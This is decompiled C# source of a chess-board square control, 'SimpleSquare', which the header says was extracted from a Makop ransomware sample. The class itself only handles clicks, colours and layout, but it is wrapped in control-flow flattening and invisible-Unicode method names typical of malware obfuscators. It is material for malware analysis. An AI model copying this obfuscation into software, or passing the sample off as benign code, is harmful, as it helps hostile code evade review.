// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: Yx, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 400FF0AC-C9F5-4D3D-92AD-97AFF85F6668
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-3ae1c8125ddc0d024ac1f14b9ba78e44f10bfc281ca7e9c68cec7db8af6ee9b3.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = -1859447906;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -830626316)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u202B⁯‭​⁯⁭⁪‎‌‫⁬⁮‬⁫⁭‎‏‬‌⁪‮‬⁭​‮‎​⁪‏‫‍⁫⁯⁮⁯⁪‫‌⁯‪‮((Delegate) comparand, (Delegate) value), comparand);
              int num3 = eventHandler != comparand ? -431153562 : (num3 = -1969069189);
              num1 = num3 ^ (int) num2 * -838065640;
              continue;
            case 2:
              comparand = eventHandler;
              num1 = -287131871;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -20218268;
        EventHandler<MouseEventArgs> eventHandler2;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -750605347)) % 6U)
          {
            case 0:
              int num3 = eventHandler1 != comparand ? 1196776388 : (num3 = 1953982643);
              num1 = num3 ^ (int) num2 * 1769908698;
              continue;
            case 1:
              comparand = eventHandler1;
              num1 = -1543725672;
              continue;
            case 2:
              goto label_1;
            case 3:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -2096895119 ^ -177078704;
              continue;
            case 4:
              goto label_3;
            case 5:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u206A⁯‪‍⁫‭‫‎⁮⁮‪‭‍⁬​‬⁪‎‏‬‮⁬⁫‪⁫⁬‫⁪⁮⁪‌‮‫‭‫⁪⁪‮‭⁮‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * 143272799 ^ -846021717;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = -960142764;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1205766751)) % 4U)
          {
            case 0:
              num1 = (int) num2 * -794705829 ^ -520056934;
              continue;
            case 1:
              piece = this.piece;
              num1 = (int) num2 * -213021937 ^ -89919462;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return piece;
      }
      set
      {
        this.piece = value;
        if (this.piece != null)
          goto label_6;
label_1:
        int num1 = 541344205;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 51630371)) % 7U)
          {
            case 0:
              num1 = (int) num2 * -550459444 ^ 990309658;
              continue;
            case 1:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u200C‫‌‪‫⁫⁫​‌⁯‎​⁬​⁬⁮⁯‎‎‪⁪‎⁭‎​‭‪​⁭⁬‪‮‌⁪‬⁫⁯⁪⁮⁯‮((Control) this, (Image) null);
              num1 = (int) num2 * -1928512566 ^ -831862518;
              continue;
            case 2:
              goto label_6;
            case 3:
              num1 = (int) num2 * 1828474649 ^ -1005350949;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              num1 = (int) num2 * 293881928 ^ -1949197434;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_6:
        SimpleSquare.\u200C‫‌‪‫⁫⁫​‌⁯‎​⁬​⁬⁮⁯‎‎‪⁪‎⁭‎​‭‪​⁭⁬‪‮‌⁪‬⁫⁯⁪⁮⁯‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
        num1 = 104720863;
        goto label_2;
      }
    }

    public void colorSquare()
    {
label_1:
      int num1 = -1471537936;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1140255925)) % 4U)
        {
          case 0:
            SimpleSquare.\u202B‍⁭‍‌⁫‪‭⁪​⁭​‪‍⁪‌‫‮‬⁯‫‫‍⁬‪‬⁬⁯⁪‎⁭⁮⁭‬‍‏⁭⁯⁫‍‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * 280773205 ^ -587787554;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
            num1 = -1997766469;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public Pieces Kind
    {
      set
      {
label_1:
        int num1 = 2125138850;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 830627761)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Piece.Kind = value;
              this.Piece = this.Piece;
              num1 = (int) num2 * 529687707 ^ 1805270655;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public bool IsBlackSquare
    {
      get => this.isBlackSquare;
      set
      {
        this.isBlackSquare = value;
        this.colorSquare();
label_1:
        int num1 = -1626077540;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -452042577)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -1916488318 ^ -1332365080;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public Repository repo
    {
      get
      {
label_1:
        int num1 = 1045070204;
        Repository repo;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2087046827)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              repo = ChessContext.repo;
              num1 = (int) num2 * 779228983 ^ -708265942;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return repo;
      }
    }

    public SimpleSquare()
    {
label_1:
      int num1 = -1777405533;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1336067669)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 222615858 ^ 174594821;
            continue;
          case 3:
            SimpleSquare.\u206C‫⁬​⁮‍⁭‌⁪‌‬⁯⁮‭‏‭‎⁪‏​⁫‪⁬‫‮⁯‬‎⁪​⁫‪‮⁫⁬​⁯‌‌⁭‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -1028696519 ^ -1359417929;
            continue;
          case 4:
            num1 = (int) num2 * 2018553661 ^ -1261393412;
            continue;
          case 5:
            num1 = (int) num2 * -1619177800 ^ 944377605;
            continue;
          case 6:
            num1 = (int) num2 * 1780438422 ^ 1588270649;
            continue;
          case 7:
            this.InitializeComponent();
            num1 = (int) num2 * -159186428 ^ 191771455;
            continue;
          case 8:
            SimpleSquare.\u202E‎‍‮⁪‏‫⁪⁮⁬‫‪‮‌‮⁪‫‌⁮⁭⁯⁭⁯‌⁪‬‭⁯⁯‫⁪‭‬‍‍‏⁪⁬‍‭‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -1041930582 ^ -378587329;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
      EventHandler<MouseEventArgs> click = this.Click;
      if (click == null)
        return;
      click((object) this, e);
label_3:
      int num1 = 973954733;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 405607689)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_6;
          case 2:
            num1 = (int) num2 * -1178928322 ^ 100613067;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    public void HighLight()
    {
label_1:
      int num1 = 669767991;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1896645574)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u202B‍⁭‍‌⁫‪‭⁪​⁭​‪‍⁪‌‫‮‬⁯‫‫‍⁬‪‬⁬⁯⁪‎⁭⁮⁭‬‍‏⁭⁯⁫‍‮((Control) this, Color.ForestGreen);
            num1 = (int) num2 * 16817349 ^ -599265024;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * -1001366203 ^ -1164931785;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void ClearHighLight() => SimpleSquare.\u202B‍⁭‍‌⁫‪‭⁪​⁭​‪‍⁪‌‫‮‬⁯‫‫‍⁬‪‬⁬⁯⁪‎⁭⁮⁭‬‍‏⁭⁯⁫‍‮((Control) this, this.DefaultColor);

    public bool IsEmpty
    {
      get
      {
label_1:
        int num1 = -399638564;
        bool isEmpty;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1412319655)) % 4U)
          {
            case 0:
              num1 = (int) num2 * -1174945008 ^ -1211899602;
              continue;
            case 1:
              isEmpty = this.Piece == null;
              num1 = (int) num2 * -910826047 ^ -1694924608;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -1388855152;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ -2138905163)) % 10U)
        {
          case 0:
            base.Dispose(disposing);
            num1 = -1555733849;
            continue;
          case 1:
            num1 = (int) num2 * 1428572038 ^ -1542535391;
            continue;
          case 2:
            num1 = (int) num2 * -288240109 ^ -1506589797;
            continue;
          case 3:
            int num4 = flag ? -255697093 : (num4 = -835757491);
            num1 = num4 ^ (int) num2 * -2100820422;
            continue;
          case 4:
            goto label_3;
          case 5:
            if (!disposing)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * 1669402951 ^ 575430417;
            continue;
          case 6:
            num1 = (int) num2 * 260746528 ^ -115398174;
            continue;
          case 7:
            num3 = this.components != null ? 1 : 0;
            break;
          case 8:
            SimpleSquare.\u200B⁪⁫⁮⁫​‬⁪‪‮‎​​‍⁬‏‎⁭‍⁪‬⁫​​⁮‮⁪⁫‬⁭‍⁯‪‎‮‭​⁫⁯⁫‮((IDisposable) this.components);
            num1 = (int) num2 * 290483879 ^ -609229487;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_15;
        }
        flag = num3 != 0;
        num1 = -992618886;
      }
label_3:
      return;
label_15:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = 1279366734;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1207489591)) % 25U)
        {
          case 0:
            SimpleSquare.\u200E‭‭⁪‭⁭‎⁪‏‎⁯‮⁬‏⁯⁮⁬​‍⁯‌⁪⁫‭⁯​⁫⁯​⁪⁮⁬‏‍⁫‫⁬⁪⁬‍‮((Control) this, \u003CModule\u003E.\u202A⁫​‌‌‪‫‪‮‬‬⁫‌‬⁪‏‌​‪⁪‍‎⁭‎‮‫⁪‏‫‬‌⁭‭⁬‫‌‮⁬‏‍‮<string>(2068035397U));
            num1 = (int) num2 * 241975502 ^ -2130725762;
            continue;
          case 1:
            num1 = (int) num2 * 1496431510 ^ -305611245;
            continue;
          case 2:
            SimpleSquare.\u200B​⁯⁭⁬⁯⁭‮⁭‪⁮⁯‌⁫‏‭‫⁫⁮‏​⁮⁬⁬‭⁫⁮⁫‏⁫‏⁫‫‍⁪‪⁬⁫⁮⁯‮((Control) this.panel1, 0);
            num1 = (int) num2 * 145931990 ^ 1831059092;
            continue;
          case 3:
            this.panel1 = SimpleSquare.\u200E‫‫‍⁬‫​⁮​⁪⁯⁬‎‌⁫‬⁮‫⁬⁪‏‮‭‍‌⁫⁬‎‍⁪‭‬⁭‎‎⁫‪‎‎‍‮();
            num1 = (int) num2 * -2110288184 ^ -168860904;
            continue;
          case 4:
            SimpleSquare.\u206F‏​‏‎⁮⁫‬⁮‭⁪‍‍‎⁮​⁪‎⁭‫‌⁭⁭‫‌‫‌⁬⁫‌‪‫⁭​‬‏‫​​⁮‮((Control) this, false);
            num1 = (int) num2 * -88944634 ^ -1894483472;
            continue;
          case 5:
            SimpleSquare.\u206D⁬‏‭⁯‪⁭‭‍​⁫⁭‍⁪‏⁯‎⁯​⁭​‌⁭‏⁯‏⁭‪‫‏⁪⁫‏⁯‌‭‏​⁬⁫‮((Control) this, new Padding(0));
            num1 = (int) num2 * 1625826571 ^ -1571397508;
            continue;
          case 6:
            goto label_1;
          case 7:
            SimpleSquare.\u200F⁯‏⁯⁫⁮​​⁪⁫‭⁯⁮‏‬⁫⁫⁭​‮⁮‪‏‫‏‍‬⁫‌⁯‮‍‫‎⁭‪⁮‎‍⁯‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * -1523509755 ^ -1695097130;
            continue;
          case 8:
            SimpleSquare.\u206E‌⁪‬‏‌‍​⁮‪‎‮⁪‫⁯‌‫‫⁯⁮⁯⁬⁪⁯‎⁫​‏⁬⁪‭‭‭⁯⁬‭‬‏⁪‍‮((Control) this);
            num1 = (int) num2 * -1062570346 ^ -1086824322;
            continue;
          case 9:
            SimpleSquare.\u200B‌‬‌⁭‍‌⁬‪‮‏⁯‭⁪‏‫‌⁫‌‮⁭‮‌‏⁯‪⁬⁮⁯⁭⁮‮⁪‫⁫‌​‫⁪⁮‮((Control) this.panel1, new Point(0, 0));
            SimpleSquare.\u200C⁫‌⁪‭⁬‮⁫⁬⁫⁯‭‭‌⁬‌⁮⁫‫⁬‎‪‍‪‬‍‌‏‏‌‌⁯⁪​‎⁭‮⁭‌‮‮((Control) this.panel1, \u003CModule\u003E.\u202A⁫​‌‌‪‫‪‮‬‬⁫‌‬⁪‏‌​‪⁪‍‎⁭‎‮‫⁪‏‫‬‌⁭‭⁬‫‌‮⁬‏‍‮<string>(3465864549U));
            SimpleSquare.\u206C‌⁭⁯‎‬‫⁭‎⁫⁭⁬⁬‌‭‌⁪⁯‌​‫‏⁮‭‌⁮‮⁪‬⁫​‍‬⁬‭‏⁯‬⁭‏‮((Control) this.panel1, new Size(137, 132));
            num1 = (int) num2 * 1588565218 ^ -1582635476;
            continue;
          case 10:
            SimpleSquare.\u200C‬‭⁬⁬‮‮⁪​⁫‍‌‏‍⁬​‭‎⁬⁮⁪‍‍‫⁭⁫⁭⁮‎‏​‮‍⁭‎‭‬⁭‭‭‮(SimpleSquare.\u206D⁯⁬⁭​⁮‭⁪⁭‌‌⁭​⁭‍⁯‮‪‏⁬⁯‏‍⁭‪‎⁫‍​⁬‎​‌‌‭⁮⁬‌‍‫‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * -295357307 ^ -214129627;
            continue;
          case 11:
            num1 = (int) num2 * -528061135 ^ -730180624;
            continue;
          case 12:
            goto label_3;
          case 13:
            num1 = (int) num2 * -528811761 ^ 1356939962;
            continue;
          case 14:
            SimpleSquare.\u202E⁮‍⁯⁯⁪‎⁬‏‫‍‬⁫‎‎​‫⁫‌‭⁭⁯⁫⁯‪⁫⁯⁯⁪⁭‎⁬‮​‫‭‮‬‫‫‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 1064045286 ^ 523376180;
            continue;
          case 15:
            SimpleSquare.\u206B‮⁯‎⁭‌‬‏‌⁫⁫‌‫‏‍‌‏‌‭‏‍‪⁪‮⁭‎⁮⁭‮⁪‬‭⁫‭‪⁯‌‬⁯‫‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * -48205593 ^ -419108804;
            continue;
          case 16:
            SimpleSquare.\u206A‬⁭⁯⁬⁫‪‏​⁭⁫‎⁪⁮⁭⁭‌​‍⁪⁬⁫⁭‭⁮⁫‏‪⁮⁬⁪‬‌‬⁬⁪‌‫​‏‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 1444692584 ^ -840345904;
            continue;
          case 17:
            num1 = (int) num2 * 1044124858 ^ -670811646;
            continue;
          case 18:
            num1 = (int) num2 * 868272298 ^ 753127415;
            continue;
          case 19:
            num1 = (int) num2 * 1414387875 ^ 2109931563;
            continue;
          case 20:
            num1 = (int) num2 * 1429006730 ^ -621960791;
            continue;
          case 21:
            SimpleSquare.\u202B‍⁭‍‌⁫‪‭⁪​⁭​‪‍⁪‌‫‮‬⁯‫‫‍⁬‪‬⁬⁯⁪‎⁭⁮⁭‬‍‏⁭⁯⁫‍‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -814099281 ^ -1705563515;
            continue;
          case 22:
            SimpleSquare.\u202C⁮⁫‎⁮‬‮‪‏‌⁭⁯‮⁭‪‌‏‪⁭​‪‏‫‪‭​⁪‌‌‬‏‪⁪‎⁭⁯⁯‪‎‪‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 817048664 ^ 1498715875;
            continue;
          case 23:
            SimpleSquare.\u202C⁮⁫‎⁮‬‮‪‏‌⁭⁯‮⁭‪‌‏‪⁭​‪‏‫‪‭​⁪‌‌‬‏‪⁪‎⁭⁯⁯‪‎‪‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -1020661141 ^ -1860610997;
            continue;
          case 24:
            num1 = (int) num2 * 636038151 ^ -905612257;
            continue;
          default:
            goto label_27;
        }
      }
label_3:
      return;
label_27:;
    }

    static Delegate \u202B⁯‭​⁯⁭⁪‎‌‫⁬⁮‬⁫⁭‎‏‬‌⁪‮‬⁭​‮‎​⁪‏‫‍⁫⁯⁮⁯⁪‫‌⁯‪‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u206A⁯‪‍⁫‭‫‎⁮⁮‪‭‍⁬​‬⁪‎‏‬‮⁬⁫‪⁫⁬‫⁪⁮⁪‌‮‫‭‫⁪⁪‮‭⁮‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200C‫‌‪‫⁫⁫​‌⁯‎​⁬​⁬⁮⁯‎‎‪⁪‎⁭‎​‭‪​⁭⁬‪‮‌⁪‬⁫⁯⁪⁮⁯‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u202B‍⁭‍‌⁫‪‭⁪​⁭​‪‍⁪‌‫‮‬⁯‫‫‍⁬‪‬⁬⁯⁪‎⁭⁮⁭‬‍‏⁭⁯⁫‍‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u202E‎‍‮⁪‏‫⁪⁮⁬‫‪‮‌‮⁪‫‌⁮⁭⁯⁭⁯‌⁪‬‭⁯⁯‫⁪‭‬‍‍‏⁪⁬‍‭‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u206C‫⁬​⁮‍⁭‌⁪‌‬⁯⁮‭‏‭‎⁪‏​⁫‪⁬‫‮⁯‬‎⁪​⁫‪‮⁫⁬​⁯‌‌⁭‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200B⁪⁫⁮⁫​‬⁪‪‮‎​​‍⁬‏‎⁭‍⁪‬⁫​​⁮‮⁪⁫‬⁭‍⁯‪‎‮‭​⁫⁯⁫‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u200E‫‫‍⁬‫​⁮​⁪⁯⁬‎‌⁫‬⁮‫⁬⁪‏‮‭‍‌⁫⁬‎‍⁪‭‬⁭‎‎⁫‪‎‎‍‮() => new Panel();

    static void \u206E‌⁪‬‏‌‍​⁮‪‎‮⁪‫⁯‌‫‫⁯⁮⁯⁬⁪⁯‎⁫​‏⁬⁪‭‭‭⁯⁬‭‬‏⁪‍‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202C⁮⁫‎⁮‬‮‪‏‌⁭⁯‮⁭‪‌‏‪⁭​‪‏‫‪‭​⁪‌‌‬‏‪⁪‎⁭⁯⁯‪‎‪‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200F⁯‏⁯⁫⁮​​⁪⁫‭⁯⁮‏‬⁫⁫⁭​‮⁮‪‏‫‏‍‬⁫‌⁯‮‍‫‎⁭‪⁮‎‍⁯‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u200B‌‬‌⁭‍‌⁬‪‮‏⁯‭⁪‏‫‌⁫‌‮⁭‮‌‏⁯‪⁬⁮⁯⁭⁮‮⁪‫⁫‌​‫⁪⁮‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u200C⁫‌⁪‭⁬‮⁫⁬⁫⁯‭‭‌⁬‌⁮⁫‫⁬‎‪‍‪‬‍‌‏‏‌‌⁯⁪​‎⁭‮⁭‌‮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206C‌⁭⁯‎‬‫⁭‎⁫⁭⁬⁬‌‭‌⁪⁯‌​‫‏⁮‭‌⁮‮⁪‬⁫​‍‬⁬‭‏⁯‬⁭‏‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200B​⁯⁭⁬⁯⁭‮⁭‪⁮⁯‌⁫‏‭‫⁫⁮‏​⁮⁬⁬‭⁫⁮⁫‏⁫‏⁫‫‍⁪‪⁬⁫⁮⁯‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206B‮⁯‎⁭‌‬‏‌⁫⁫‌‫‏‍‌‏‌‭‏‍‪⁪‮⁭‎⁮⁭‮⁪‬‭⁫‭‪⁯‌‬⁯‫‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u206A‬⁭⁯⁬⁫‪‏​⁭⁫‎⁪⁮⁭⁭‌​‍⁪⁬⁫⁭‭⁮⁫‏‪⁮⁬⁪‬‌‬⁬⁪‌‫​‏‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u206D⁯⁬⁭​⁮‭⁪⁭‌‌⁭​⁭‍⁯‮‪‏⁬⁯‏‍⁭‪‎⁫‍​⁬‎​‌‌‭⁮⁬‌‍‫‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u200C‬‭⁬⁬‮‮⁪​⁫‍‌‏‍⁬​‭‎⁬⁮⁪‍‍‫⁭⁫⁭⁮‎‏​‮‍⁭‎‭‬⁭‭‭‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u206D⁬‏‭⁯‪⁭‭‍​⁫⁭‍⁪‏⁯‎⁯​⁭​‌⁭‏⁯‏⁭‪‫‏⁪⁫‏⁯‌‭‏​⁬⁫‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u200E‭‭⁪‭⁭‎⁪‏‎⁯‮⁬‏⁯⁮⁬​‍⁯‌⁪⁫‭⁯​⁫⁯​⁪⁮⁬‏‍⁫‫⁬⁪⁬‍‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202E⁮‍⁯⁯⁪‎⁬‏‫‍‬⁫‎‎​‫⁫‌‭⁭⁯⁫⁯‪⁫⁯⁯⁪⁭‎⁬‮​‫‭‮‬‫‫‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206F‏​‏‎⁮⁫‬⁮‭⁪‍‍‎⁮​⁪‎⁭‫‌⁭⁭‫‌‫‌⁬⁫‌‪‫⁭​‬‏‫​​⁮‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
